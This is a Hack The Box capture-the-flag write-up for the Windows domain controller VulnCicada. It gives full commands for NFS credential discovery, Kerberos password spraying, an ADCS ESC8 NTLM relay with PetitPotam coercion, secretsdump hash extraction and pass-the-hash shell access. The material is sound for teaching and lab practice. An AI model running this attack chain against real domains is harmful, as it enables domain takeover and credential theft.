# HTB: VulnCicada

## Summary

VulnCicada is a Windows Domain Controller machine that requires exploiting an **NFS share** to find credentials, then abusing **ADCS ESC8** vulnerability to get a certificate as the machine account, dump hashes, and get a shell as Administrator.

## Reconnaissance

### Nmap Scan

```bash
nmap -p- -vvv --min-rate 10000 10.129.234.48
```

Key open ports:
- **53** - DNS
- **80** - HTTP (IIS)
- **88** - Kerberos
- **111**, **2049** - NFS
- **135**, **139**, **445** - SMB
- **389**, **636**, **3268**, **3269** - LDAP
- **3389** - RDP
- **5985** - WinRM

The machine is a Domain Controller with domain `cicada.vl` and hostname `DC-JPQ225`.

### Hosts File

Add to `/etc/hosts`:
```
10.129.234.48 DC-JPQ225.cicada.vl cicada.vl DC-JPQ225
```

### Website - TCP 80

Default IIS page, no interesting directories found.

### NFS Share Discovery

```bash
showmount -e 10.129.234.48
# Export list for 10.129.234.48:
# /profiles (everyone)
```

Mount the share:
```bash
sudo mount -t nfs 10.129.234.48:/profiles /mnt
```

List contents:
```bash
ls /mnt
# Administrator  Daniel.Marshall  Debra.Wright  Jane.Carter
# Jordan.Francis  Joyce.Andrews  Katie.Ward  Megan.Simpson
# Richard.Gibbons  Rosie.Powell  Shirley.West
```

### Extracting Credentials

The share contains user directories. Two images are accessible:

1. **`/mnt/Administrator/vacation.png`** - Man with laptop in parachute
2. **`/mnt/Rosie.Powell/marketing.png`** - Woman at desk with sticky note

Copy the images:
```bash
cp /mnt/Administrator/vacation.png .
sudo cp /mnt/Rosie.Powell/marketing.png .
```

Viewing `marketing.png` reveals a sticky note with password: **`Cicada123`**

## Initial Access as Rosie.Powell

### Password Spray with Kerbrute

Create a user list from the NFS directories and try the password:

```bash
kerbrute passwordspray --dc DC-JPQ225.cicada.vl -d cicada.vl users.txt Cicada123
# [+] VALID LOGIN: Rosie.Powell@cicada.vl:Cicada123
```

### Get Kerberos Ticket

Configure `/etc/krb5.conf`:
```
[libdefaults]
    default_realm = CICADA.VL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = true
    rdns = false

[realms]
    CICADA.VL = {
        kdc = DC-JPQ225.cicada.vl:88
        admin_server = DC-JPQ225.cicada.vl:749
        default_domain = cicada.vl
    }

[domain_realm]
    .cicada.vl = CICADA.VL
    cicada.vl = CICADA.VL
```

Get TGT:
```bash
kinit Rosie.Powell@CICADA.VL
# Password: Cicada123
```

Set environment:
```bash
export KRB5CCNAME=/tmp/krb5cc_1000
```

### Verify Access

```bash
netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k
# [+] cicada.vl\Rosie.Powell:Cicada123
```

## ADCS Enumeration

### Check for Vulnerable Templates

```bash
certipy find -k -no-pass -target DC-JPQ225.cicada.vl -dc-ip 10.129.234.48 -ns 10.129.234.48 -enabled
```

**Result**: No vulnerable templates found, but **ESC8** vulnerability detected:
```
[!] Vulnerabilities:
    ESC8: Web Enrollment is enabled over HTTP.
```

### Check Machine Account Quota

```bash
netexec ldap DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M maq
# MachineAccountQuota: 10
```

## ESC8 Exploitation (Linux Method)

### Background

**ESC8** allows relaying NTLM authentication to AD CS HTTP enrollment endpoint. The attack:
1. Create malicious DNS record with serialized SPN
2. Coerce DC to authenticate to attacker
3. Relay auth to ADCS
4. Get certificate as machine account
5. Use certificate to get TGT and NTLM hash

### Step 1: Create Malicious DNS Record

The record format is `<host><empty CREDENTIAL_TARGET_INFOMATION structure>`:

```bash
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.79
```

### Step 2: Start Certipy Relay

```bash
certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
```

This listens on port 445.

### Step 3: Coerce Authentication

Check vulnerable methods:
```bash
netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus
```

Trigger PetitPotam:
```bash
netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

### Step 4: Get Certificate

Certipy receives the authentication and issues a certificate:
```
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
```

### Step 5: Authenticate as Machine Account

```bash
certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48
```

Output:
```
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

Set TGT:
```bash
export KRB5CCNAME=dc-jpq225.ccache
```

## Privilege Escalation to Administrator

### Dump Hashes with secretsdump

```bash
secretsdump.py -k -no-pass cicada.vl/dc-jpq225\$@dc-jpq225.cicada.vl -just-dc-user administrator
```

Output:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
```

### Verify Administrator Access

```bash
netexec smb dc-jpq225.cicada.vl -u administrator -H 85a0da53871a9d56b6cd05deda3a5e87 -k
# [+] cicada.vl\administrator:85a0da53871a9d56b6cd05deda3a5e87 (Pwn3d!)
```

###For a full interactive shell as Administrator:

```bash
impacket-wmiexec -k -hashes 'aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87' cicada.vl/Administrator@DC-JPQ225.cicada.vl
Or using psexec:
```

```cmd
C:\> cd Users\Administrator\Desktop
C:\Users\Administrator\Desktop> type user.txt
c6a8fc2e************************
C:\Users\Administrator\Desktop> type root.txt
65d0019f************************
```

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| showmount | NFS enumeration |
| kerbrute | Kerberos user enumeration & password spray |
| certipy | ADCS enumeration and ESC8 exploitation |
| bloodyAD | DNS record manipulation |
| netexec | SMB/LDAP enumeration and coercion |
| secretsdump | NTDS hash dumping |
| wmiexec | Remote command execution |

## Key Takeaways

1. **NFS Misconfiguration** - World-readable `/profiles` share exposed user directories with sensitive images containing credentials
2. **Password Reuse** - `Cicada123` was reused across users
3. **ADCS ESC8** - Web enrollment over HTTP allowed NTLM relay attack
4. **Machine Account Privilege** - Machine account had sufficient privileges to dump NTDS
5. **Linux Attack Path** - ESC8 can be exploited entirely from Linux without joining domain

## References

- [Certipy ESC8 Wiki](https://github.com/ly4k/Certipy/wiki/ESC8)
- [PetitPotam Coercion](https://github.com/topotam/PetitPotam)
- [AD CS Attack Guide](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
